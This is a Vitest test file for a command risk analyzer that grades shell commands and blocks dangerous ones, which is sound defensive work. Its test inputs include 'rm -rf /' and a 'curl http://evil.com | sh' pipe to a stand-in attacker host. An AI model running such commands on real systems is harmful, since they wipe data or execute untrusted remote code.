import { describe, it, expect } from 'vitest';
import { CommandRiskAnalyzer } from '../src/command-risk.js';

describe('CommandRiskAnalyzer', () => {
  const analyzer = new CommandRiskAnalyzer();

  it('detects rm -rf', () => {
    const result = analyzer.analyze('rm -rf /');
    expect(result.riskLevel).toBe('CRITICAL');
    expect(result.allowed).toBe(false);
  });

  it('detects eval', () => {
    const result = analyzer.analyze('eval("code")');
    expect(result.riskLevel).toBe('HIGH');
  });

  it('detects curl pipe', () => {
    const result = analyzer.analyze('curl http://evil.com | sh');
    expect(result.riskLevel).toBe('CRITICAL');
    expect(result.allowed).toBe(false);
  });

  it('passes safe command', () => {
    const result = analyzer.analyze('ls -la');
    expect(result.riskLevel).toBe('LOW');
    expect(result.allowed).toBe(true);
  });

  it('detects git force push', () => {
    const result = analyzer.analyze('git push origin main --force');
    expect(result.riskLevel).toBe('HIGH');
  });

  it('analyzes batch', () => {
    const results = analyzer.analyzeBatch(['ls', 'rm -rf /', 'cat file.txt']);
    expect(results.length).toBe(3);
    expect(results[1].riskLevel).toBe('CRITICAL');
  });
});
